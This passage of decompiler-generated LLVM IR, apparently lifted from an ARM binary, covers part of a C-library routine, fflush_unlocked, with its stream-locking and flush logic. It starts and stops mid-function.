dec_label_pc_15190:                               ; preds = %dec_label_pc_15160, %dec_label_pc_15178.dec_label_pc_1516c_crit_edge, %dec_label_pc_1518c
  %v0_15198 = phi i32 [ %v0_1518c, %dec_label_pc_1518c ], [ %v2_1516c62, %dec_label_pc_15160 ], [ %v2_1516c, %dec_label_pc_15178.dec_label_pc_1516c_crit_edge ]
  %v1_15190 = phi i32 [ %v0_1518c, %dec_label_pc_1518c ], [ %v2_15160, %dec_label_pc_15160 ], [ %v1_15170.pre, %dec_label_pc_15178.dec_label_pc_1516c_crit_edge ]
  %v3_15190 = icmp uge i32 %v0_15198, %v1_15190
  store i1 %v3_15190, i1* %cpsr_c.global-to-local, align 1
  %v9_15190 = icmp eq i32 %v0_15198, %v1_15190
  br i1 %v9_15190, label %dec_label_pc_15198, label %dec_label_pc_15190.dec_label_pc_15160_crit_edge

dec_label_pc_15190.dec_label_pc_15160_crit_edge:  ; preds = %dec_label_pc_15190
  %v0_15160.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15160

dec_label_pc_15198:                               ; preds = %dec_label_pc_15190
  %v2_15198 = icmp ne i32 %v1_15190, 0
  store i1 %v2_15198, i1* %cpsr_c.global-to-local, align 1
  %v7_1519c = icmp slt i32 %v1_15190, 2
  br i1 %v7_1519c, label %dec_label_pc_151b8, label %dec_label_pc_151a0

dec_label_pc_151a0:                               ; preds = %dec_label_pc_15198
  %v0_151a0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_151a0, i32* %r0.global-to-local, align 4
  %v0_151a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_151a4 = add i32 %v0_151a4, 129
  store i32 %v1_151a4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_151b8

dec_label_pc_151b8:                               ; preds = %dec_label_pc_15128, %dec_label_pc_151a0, %dec_label_pc_15198
  %v2_151bc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_151bc, i32* %r4.global-to-local, align 4
  %v1_151c0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_151c0

; uselistorder directives
  uselistorder i32 %v0_1518c, { 1, 0, 2 }
  uselistorder i32 %v1_15170.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15160, { 1, 0 }
  uselistorder i32 %v0_150ec, { 1, 0, 2 }
  uselistorder i32 %v1_150d0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_150c0, { 1, 0 }
  uselistorder i32 %v0_1508c, { 2, 1, 0 }
  uselistorder i32 %v0_15030, { 1, 0 }
  uselistorder i32 %v0_15014, { 1, 0, 2 }
  uselistorder i32 %v1_14ff8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_14fe4, { 1, 0 }
  uselistorder i32 %v0_14f88, { 1, 0, 2 }
  uselistorder i32 %v1_14f6c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_14f40, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 7, 8, 10, 9, 11, 13, 12, 14 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 39, 4, 5, 6, 7, 8, 9, 10, 12, 11, 40, 13, 14, 15, 43, 44, 16, 17, 18, 19, 20, 21, 22, 24, 23, 42, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 41, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 20, 21, 4, 5, 6, 7, 22, 23, 8, 11, 9, 10, 0, 12, 13, 26, 27, 14, 15, 16, 17, 18, 24, 25, 19 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 1, 0, 5, 2, 3, 4 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_151b8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15190, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15178, { 1, 0 }
  uselistorder label %dec_label_pc_15128, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15118, { 1, 2, 0 }
  uselistorder label %dec_label_pc_150f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_150d8, { 1, 0 }
  uselistorder label %dec_label_pc_1508c, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_15054, { 1, 0 }
  uselistorder label %dec_label_pc_15028, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_15018, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15000, { 1, 0 }
  uselistorder label %dec_label_pc_14f9c, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_14f8c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14f74, { 1, 0 }
}

define i32 @function_151c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_151c8:
  %v0_151c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_151c8, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_151c8
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_151c8, %bb
  %v10_151dc = phi i32 [ %arg1, %dec_label_pc_151c8 ], [ 0, %bb ]
  ret i32 %v10_151dc

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_151e0 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r6, align 4
  %v4_151f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 76) to i32*), align 4
  store i32 %v4_151f0, i32* %r3.global-to-local, align 4
  %v4_151f4 = icmp uge i32 %tmp, %v4_151f0
  store i1 %v4_151f4, i1* %cpsr_c.global-to-local, align 1
  %v10_151f4 = icmp eq i32 %tmp, %v4_151f0
  br i1 %v10_151f4, label %bb, label %dec_label_pc_1520c

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_1521c

dec_label_pc_1520c:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_15210 = icmp eq i16* %arg1, null
  br i1 %v3_15210, label %dec_label_pc_1521c, label %dec_label_pc_15530

dec_label_pc_1521c:                               ; preds = %bb, %dec_label_pc_1520c
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_1520c ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_15220 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 160) to i32*), align 4
  store i32 %v4_15220, i32* %r5.global-to-local, align 4
  %v0_15224 = call i32 @__aeabi_read_tp()
  store i32 %v0_15224, i32* %r0.global-to-local, align 4
  %v1_15228 = add i32 %v4_15220, 8
  %v2_15228 = inttoptr i32 %v1_15228 to i32*
  %v3_15228 = load i32, i32* %v2_15228, align 4
  store i32 %v3_15228, i32* %r3.global-to-local, align 4
  %v1_1522c = add i32 %v0_15224, -1168
  store i32 %v1_1522c, i32* %r8.global-to-local, align 4
  %v3_15230 = icmp uge i32 %v3_15228, %v1_1522c
  store i1 %v3_15230, i1* %cpsr_c.global-to-local, align 1
  %v9_15230 = icmp eq i32 %v3_15228, %v1_1522c
  br i1 %v9_15230, label %dec_label_pc_15278, label %dec_label_pc_15238

dec_label_pc_15238:                               ; preds = %dec_label_pc_1521c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_15220, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_15244143 = inttoptr i32 %v4_15220 to i32*
  %v2_15244144 = load i32, i32* %v1_15244143, align 4
  store i32 %v2_15244144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15248146 = icmp eq i32 %v2_15244144, 0
  br i1 %v9_15248146, label %dec_label_pc_15250, label %dec_label_pc_15268

dec_label_pc_15250:                               ; preds = %dec_label_pc_15238, %dec_label_pc_15250.dec_label_pc_15244_crit_edge
  %v0_15250147 = phi i32 [ %v1_15248.pre, %dec_label_pc_15250.dec_label_pc_15244_crit_edge ], [ 0, %dec_label_pc_15238 ]
  store i32 %v0_15250147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15260 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15260, label %dec_label_pc_15264, label %dec_label_pc_15250.dec_label_pc_15244_crit_edge

dec_label_pc_15250.dec_label_pc_15244_crit_edge:  ; preds = %dec_label_pc_15250
  %v0_15244.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15248.pre = load i32, i32* @r4, align 4
  %v1_15244 = inttoptr i32 %v0_15244.pre to i32*
  %v2_15244 = load i32, i32* %v1_15244, align 4
  store i32 %v2_15244, i32* %r3.global-to-local, align 4
  %v3_15248 = icmp uge i32 %v2_15244, %v1_15248.pre
  store i1 %v3_15248, i1* %cpsr_c.global-to-local, align 1
  %v9_15248 = icmp eq i32 %v2_15244, %v1_15248.pre
  br i1 %v9_15248, label %dec_label_pc_15250, label %dec_label_pc_15268

dec_label_pc_15264:                               ; preds = %dec_label_pc_15250
  %v0_15264 = load i32, i32* @r4, align 4
  store i32 %v0_15264, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15268

dec_label_pc_15268:                               ; preds = %dec_label_pc_15238, %dec_label_pc_15250.dec_label_pc_15244_crit_edge, %dec_label_pc_15264
  %v0_15268 = phi i32 [ %v0_15264, %dec_label_pc_15264 ], [ %v2_15244144, %dec_label_pc_15238 ], [ %v2_15244, %dec_label_pc_15250.dec_label_pc_15244_crit_edge ]
  %v1_15268 = phi i32 [ %v0_15264, %dec_label_pc_15264 ], [ 0, %dec_label_pc_15238 ], [ %v1_15248.pre, %dec_label_pc_15250.dec_label_pc_15244_crit_edge ]
  %v3_15268 = icmp uge i32 %v0_15268, %v1_15268
  store i1 %v3_15268, i1* %cpsr_c.global-to-local, align 1
  %v9_15268 = icmp eq i32 %v0_15268, %v1_15268
  br i1 %v9_15268, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_15268
  %v1_1526c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1526c, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_15268, %bb65
  %v1_15270 = xor i1 %v9_15268, true
  call void @__pseudo_cond_branch(i1 %v1_15270, i32 ptrtoint (i32* @global_var_12a60.740 to i32))
  %v0_15274 = load i32, i32* %r8.global-to-local, align 4
  %v1_15274 = load i32, i32* %r5.global-to-local, align 4
  %v2_15274 = add i32 %v1_15274, 8
  %v3_15274 = inttoptr i32 %v2_15274 to i32*
  store i32 %v0_15274, i32* %v3_15274, align 4
  br label %dec_label_pc_15278

dec_label_pc_15278:                               ; preds = %dec_label_pc_1521c, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1527c = load i32, i32* @r6, align 4
  %v2_1527c = add i32 %v0_1527c, 160
  %v3_1527c = inttoptr i32 %v2_1527c to i32*
  %v4_1527c = load i32, i32* %v3_1527c, align 4
  store i32 %v4_1527c, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_15284 = add i32 %v0_1527c, 12
  %v3_15284 = inttoptr i32 %v2_15284 to i32*
  %v4_15284 = load i32, i32* %v3_15284, align 4
  store i32 %v4_15284, i32* %r2.global-to-local, align 4
  %v1_15288 = add i32 %v4_1527c, 4
  %v2_15288 = inttoptr i32 %v1_15288 to i32*
  %v3_15288 = load i32, i32* %v2_15288, align 4
  store i32 %v3_15288, i32* %r1.global-to-local, align 4
  %v1_1528c = inttoptr i32 %v4_15284 to i32*
  %v2_1528c = load i32, i32* %v1_1528c, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15290 = icmp eq i32 %v3_15288, 0
  %v1_15294 = add i32 %v2_1528c, 1
  store i32 %v1_15294, i32* %r3.global-to-local, align 4
  store i32 %v1_15294, i32* %v1_1528c, align 4
  br i1 %v2_15290, label %dec_label_pc_152a0, label %dec_label_pc_15300

dec_label_pc_152a0:                               ; preds = %dec_label_pc_15278
  %v0_152a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_152a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_152a0 = add i32 %v1_152a0, 8
  %v3_152a0 = inttoptr i32 %v2_152a0 to i32*
  store i32 %v0_152a0, i32* %v3_152a0, align 4
  %v0_152a4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_152a4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_152a8

dec_label_pc_152a8:                               ; preds = %dec_label_pc_152d8.dec_label_pc_152a8_crit_edge, %dec_label_pc_152a0
  %v0_152a8 = phi i32 [ %v0_152a8.pre, %dec_label_pc_152d8.dec_label_pc_152a8_crit_edge ], [ %v0_152a4, %dec_label_pc_152a0 ]
  %v1_152a8 = inttoptr i32 %v0_152a8 to i32*
  %v2_152a8 = load i32, i32* %v1_152a8, align 4
  store i32 %v2_152a8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_152a8, i32* %r2.global-to-local, align 4
  %v2_152b4131 = load i32, i32* %v1_152a8, align 4
  store i32 %v2_152b4131, i32* %r3.global-to-local, align 4
  %v3_152b8133 = icmp uge i32 %v2_152b4131, %v2_152a8
  store i1 %v3_152b8133, i1* %cpsr_c.global-to-local, align 1
  %v9_152b8139 = icmp eq i32 %v2_152b4131, %v2_152a8
  br i1 %v9_152b8139, label %dec_label_pc_152c0, label %dec_label_pc_152d8

dec_label_pc_152c0:                               ; preds = %dec_label_pc_152a8, %dec_label_pc_152c0.dec_label_pc_152b4_crit_edge
  %v0_152c0140 = phi i32 [ %v1_152b8.pre, %dec_label_pc_152c0.dec_label_pc_152b4_crit_edge ], [ %v2_152a8, %dec_label_pc_152a8 ]
  store i32 %v0_152c0140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_152d0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_152d0, label %dec_label_pc_152d4, label %dec_label_pc_152c0.dec_label_pc_152b4_crit_edge

dec_label_pc_152c0.dec_label_pc_152b4_crit_edge:  ; preds = %dec_label_pc_152c0
  %v0_152b4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_152b8.pre = load i32, i32* @r4, align 4
  %v1_152b4 = inttoptr i32 %v0_152b4.pre to i32*
  %v2_152b4 = load i32, i32* %v1_152b4, align 4
  store i32 %v2_152b4, i32* %r3.global-to-local, align 4
  %v3_152b8 = icmp uge i32 %v2_152b4, %v1_152b8.pre
  store i1 %v3_152b8, i1* %cpsr_c.global-to-local, align 1
  %v9_152b8 = icmp eq i32 %v2_152b4, %v1_152b8.pre
  br i1 %v9_152b8, label %dec_label_pc_152c0, label %dec_label_pc_152d8

dec_label_pc_152d4:                               ; preds = %dec_label_pc_152c0
  %v0_152d4 = load i32, i32* @r4, align 4
  store i32 %v0_152d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_152d8

dec_label_pc_152d8:                               ; preds = %dec_label_pc_152a8, %dec_label_pc_152c0.dec_label_pc_152b4_crit_edge, %dec_label_pc_152d4
  %v0_152e0 = phi i32 [ %v0_152d4, %dec_label_pc_152d4 ], [ %v2_152b4131, %dec_label_pc_152a8 ], [ %v2_152b4, %dec_label_pc_152c0.dec_label_pc_152b4_crit_edge ]
  %v1_152d8 = phi i32 [ %v0_152d4, %dec_label_pc_152d4 ], [ %v2_152a8, %dec_label_pc_152a8 ], [ %v1_152b8.pre, %dec_label_pc_152c0.dec_label_pc_152b4_crit_edge ]
  %v3_152d8 = icmp uge i32 %v0_152e0, %v1_152d8
  store i1 %v3_152d8, i1* %cpsr_c.global-to-local, align 1
  %v9_152d8 = icmp eq i32 %v0_152e0, %v1_152d8
  br i1 %v9_152d8, label %dec_label_pc_152e0, label %dec_label_pc_152d8.dec_label_pc_152a8_crit_edge

dec_label_pc_152d8.dec_label_pc_152a8_crit_edge:  ; preds = %dec_label_pc_152d8
  %v0_152a8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_152a8

dec_label_pc_152e0:                               ; preds = %dec_label_pc_152d8
  %v2_152e0 = icmp ne i32 %v1_152d8, 0
  store i1 %v2_152e0, i1* %cpsr_c.global-to-local, align 1
  %v7_152e4 = icmp slt i32 %v1_152d8, 2
  br i1 %v7_152e4, label %dec_label_pc_15300, label %dec_label_pc_152e8

dec_label_pc_152e8:                               ; preds = %dec_label_pc_152e0
  %v0_152e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_152e8, i32* %r0.global-to-local, align 4
  %v0_152ec = load i32, i32* %r1.global-to-local, align 4
  %v1_152ec = add i32 %v0_152ec, 129
  store i32 %v1_152ec, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15300

dec_label_pc_15300:                               ; preds = %dec_label_pc_15278, %dec_label_pc_152e8, %dec_label_pc_152e0
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_15304 = load i32, i32* @r6, align 4
  %v2_15304 = add i32 %v0_15304, 152
  %v3_15304 = inttoptr i32 %v2_15304 to i32*
  %v4_15304 = load i32, i32* %v3_15304, align 4
  store i32 %v4_15304, i32* %r5.global-to-local, align 4
  %v1_15308 = add i32 %v4_15304, 8
  %v2_15308 = inttoptr i32 %v1_15308 to i32*
  %v3_15308 = load i32, i32* %v2_15308, align 4
  store i32 %v3_15308, i32* %r3.global-to-local, align 4
  %v1_1530c = load i32, i32* %r8.global-to-local, align 4
  %v3_1530c = icmp uge i32 %v3_15308, %v1_1530c
  store i1 %v3_1530c, i1* %cpsr_c.global-to-local, align 1
  %v9_1530c = icmp eq i32 %v3_15308, %v1_1530c
  br i1 %v9_1530c, label %dec_label_pc_15354, label %dec_label_pc_15314

dec_label_pc_15314:                               ; preds = %dec_label_pc_15300
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_15304, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_15320123 = inttoptr i32 %v4_15304 to i32*
  %v2_15320124 = load i32, i32* %v1_15320123, align 4
  store i32 %v2_15320124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15324126 = icmp eq i32 %v2_15320124, 0
  br i1 %v9_15324126, label %dec_label_pc_1532c, label %dec_label_pc_15344

dec_label_pc_1532c:                               ; preds = %dec_label_pc_15314, %dec_label_pc_1532c.dec_label_pc_15320_crit_edge
  %v0_1532c127 = phi i32 [ %v1_15324.pre, %dec_label_pc_1532c.dec_label_pc_15320_crit_edge ], [ 0, %dec_label_pc_15314 ]
  store i32 %v0_1532c127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1533c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1533c, label %dec_label_pc_15340, label %dec_label_pc_1532c.dec_label_pc_15320_crit_edge

dec_label_pc_1532c.dec_label_pc_15320_crit_edge:  ; preds = %dec_label_pc_1532c
  %v0_15320.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15324.pre = load i32, i32* @r4, align 4
  %v1_15320 = inttoptr i32 %v0_15320.pre to i32*
  %v2_15320 = load i32, i32* %v1_15320, align 4
  store i32 %v2_15320, i32* %r3.global-to-local, align 4
  %v3_15324 = icmp uge i32 %v2_15320, %v1_15324.pre
  store i1 %v3_15324, i1* %cpsr_c.global-to-local, align 1
  %v9_15324 = icmp eq i32 %v2_15320, %v1_15324.pre
  br i1 %v9_15324, label %dec_label_pc_1532c, label %dec_label_pc_15344

dec_label_pc_15340:                               ; preds = %dec_label_pc_1532c
  %v0_15340 = load i32, i32* @r4, align 4
  store i32 %v0_15340, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15344

dec_label_pc_15344:                               ; preds = %dec_label_pc_15314, %dec_label_pc_1532c.dec_label_pc_15320_crit_edge, %dec_label_pc_15340
  %v0_15344 = phi i32 [ %v0_15340, %dec_label_pc_15340 ], [ %v2_15320124, %dec_label_pc_15314 ], [ %v2_15320, %dec_label_pc_1532c.dec_label_pc_15320_crit_edge ]
  %v1_15344 = phi i32 [ %v0_15340, %dec_label_pc_15340 ], [ 0, %dec_label_pc_15314 ], [ %v1_15324.pre, %dec_label_pc_1532c.dec_label_pc_15320_crit_edge ]
  %v3_15344 = icmp uge i32 %v0_15344, %v1_15344
  store i1 %v3_15344, i1* %cpsr_c.global-to-local, align 1
  %v9_15344 = icmp eq i32 %v0_15344, %v1_15344
  br i1 %v9_15344, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_15344
  %v1_15348 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_15348, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_15344, %bb67
  %v1_1534c = xor i1 %v9_15344, true
  call void @__pseudo_cond_branch(i1 %v1_1534c, i32 ptrtoint (i32* @global_var_12a60.740 to i32))
  %v0_15350 = load i32, i32* %r8.global-to-local, align 4
  %v1_15350 = load i32, i32* %r5.global-to-local, align 4
  %v2_15350 = add i32 %v1_15350, 8
  %v3_15350 = inttoptr i32 %v2_15350 to i32*
  store i32 %v0_15350, i32* %v3_15350, align 4
  %v0_15358.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15354

dec_label_pc_15354:                               ; preds = %dec_label_pc_15300, %bb68
  %v0_15364 = phi i32 [ %v0_15304, %dec_label_pc_15300 ], [ %v0_15358.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_15358 = add i32 %v0_15364, 152
  %v3_15358 = inttoptr i32 %v2_15358 to i32*
  %v4_15358 = load i32, i32* %v3_15358, align 4
  store i32 %v4_15358, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_15360 = add i32 %v4_15358, 4
  %v2_15360 = inttoptr i32 %v1_15360 to i32*
  %v3_15360 = load i32, i32* %v2_15360, align 4
  store i32 %v3_15360, i32* %r1.global-to-local, align 4
  %v2_15364 = add i32 %v0_15364, 76
  %v3_15364 = inttoptr i32 %v2_15364 to i32*
  %v4_15364 = load i32, i32* %v3_15364, align 4
  store i32 %v4_15364, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15368 = icmp eq i32 %v3_15360, 0
  %v1_1536c = inttoptr i32 %v4_15364 to i32*
  %v2_1536c = load i32, i32* %v1_1536c, align 4
  store i32 %v2_1536c, i32* @r5, align 4
  br i1 %v2_15368, label %dec_label_pc_15374, label %dec_label_pc_153d4

dec_label_pc_15374:                               ; preds = %dec_label_pc_15354
  %v2_15374 = add i32 %v4_15358, 8
  %v3_15374 = inttoptr i32 %v2_15374 to i32*
  store i32 0, i32* %v3_15374, align 4
  %v0_15378 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15378, i32* @r7, align 4
  br label %dec_label_pc_1537c

dec_label_pc_1537c:                               ; preds = %dec_label_pc_153ac.dec_label_pc_1537c_crit_edge, %dec_label_pc_15374
  %v0_1537c = phi i32 [ %v0_1537c.pre, %dec_label_pc_153ac.dec_label_pc_1537c_crit_edge ], [ %v0_15378, %dec_label_pc_15374 ]
  %v1_1537c = inttoptr i32 %v0_1537c to i32*
  %v2_1537c = load i32, i32* %v1_1537c, align 4
  store i32 %v2_1537c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1537c, i32* %r2.global-to-local, align 4
  %v2_15388111 = load i32, i32* %v1_1537c, align 4
  store i32 %v2_15388111, i32* %r3.global-to-local, align 4
  %v3_1538c113 = icmp uge i32 %v2_15388111, %v2_1537c
  store i1 %v3_1538c113, i1* %cpsr_c.global-to-local, align 1
  %v9_1538c119 = icmp eq i32 %v2_15388111, %v2_1537c
  br i1 %v9_1538c119, label %dec_label_pc_15394, label %dec_label_pc_153ac

dec_label_pc_15394:                               ; preds = %dec_label_pc_1537c, %dec_label_pc_15394.dec_label_pc_15388_crit_edge
  %v0_15394120 = phi i32 [ %v1_1538c.pre, %dec_label_pc_15394.dec_label_pc_15388_crit_edge ], [ %v2_1537c, %dec_label_pc_1537c ]
  store i32 %v0_15394120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_153a4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_153a4, label %dec_label_pc_153a8, label %dec_label_pc_15394.dec_label_pc_15388_crit_edge

dec_label_pc_15394.dec_label_pc_15388_crit_edge:  ; preds = %dec_label_pc_15394
  %v0_15388.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1538c.pre = load i32, i32* @r4, align 4
  %v1_15388 = inttoptr i32 %v0_15388.pre to i32*
  %v2_15388 = load i32, i32* %v1_15388, align 4
  store i32 %v2_15388, i32* %r3.global-to-local, align 4
  %v3_1538c = icmp uge i32 %v2_15388, %v1_1538c.pre
  store i1 %v3_1538c, i1* %cpsr_c.global-to-local, align 1
  %v9_1538c = icmp eq i32 %v2_15388, %v1_1538c.pre
  br i1 %v9_1538c, label %dec_label_pc_15394, label %dec_label_pc_153ac

dec_label_pc_153a8:                               ; preds = %dec_label_pc_15394
  %v0_153a8 = load i32, i32* @r4, align 4
  store i32 %v0_153a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_153ac

dec_label_pc_153ac:                               ; preds = %dec_label_pc_1537c, %dec_label_pc_15394.dec_label_pc_15388_crit_edge, %dec_label_pc_153a8
  %v0_153b4 = phi i32 [ %v0_153a8, %dec_label_pc_153a8 ], [ %v2_15388111, %dec_label_pc_1537c ], [ %v2_15388, %dec_label_pc_15394.dec_label_pc_15388_crit_edge ]
  %v1_153ac = phi i32 [ %v0_153a8, %dec_label_pc_153a8 ], [ %v2_1537c, %dec_label_pc_1537c ], [ %v1_1538c.pre, %dec_label_pc_15394.dec_label_pc_15388_crit_edge ]
  %v3_153ac = icmp uge i32 %v0_153b4, %v1_153ac
  store i1 %v3_153ac, i1* %cpsr_c.global-to-local, align 1
  %v9_153ac = icmp eq i32 %v0_153b4, %v1_153ac
  br i1 %v9_153ac, label %dec_label_pc_153b4, label %dec_label_pc_153ac.dec_label_pc_1537c_crit_edge

dec_label_pc_153ac.dec_label_pc_1537c_crit_edge:  ; preds = %dec_label_pc_153ac
  %v0_1537c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1537c

dec_label_pc_153b4:                               ; preds = %dec_label_pc_153ac
  %v2_153b4 = icmp ne i32 %v1_153ac, 0
  store i1 %v2_153b4, i1* %cpsr_c.global-to-local, align 1
  %v7_153b8 = icmp slt i32 %v1_153ac, 2
  br i1 %v7_153b8, label %dec_label_pc_153d4thread-pre-split, label %dec_label_pc_153bc

dec_label_pc_153bc:                               ; preds = %dec_label_pc_153b4
  %v0_153bc = load i32, i32* @r7, align 4
  store i32 %v0_153bc, i32* %r0.global-to-local, align 4
  %v0_153c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_153c0 = add i32 %v0_153c0, 129
  store i32 %v1_153c0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_153d4thread-pre-split

dec_label_pc_153d4thread-pre-split:               ; preds = %dec_label_pc_153b4, %dec_label_pc_153bc
  %v0_15520.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_153d4

dec_label_pc_153d4:                               ; preds = %dec_label_pc_153d4thread-pre-split, %dec_label_pc_15354
  %v0_15520.pr = phi i32 [ %v0_15520.pr.pr, %dec_label_pc_153d4thread-pre-split ], [ %v2_1536c, %dec_label_pc_15354 ]
  store i32 92, i32* %sb.global-to-local, align 4
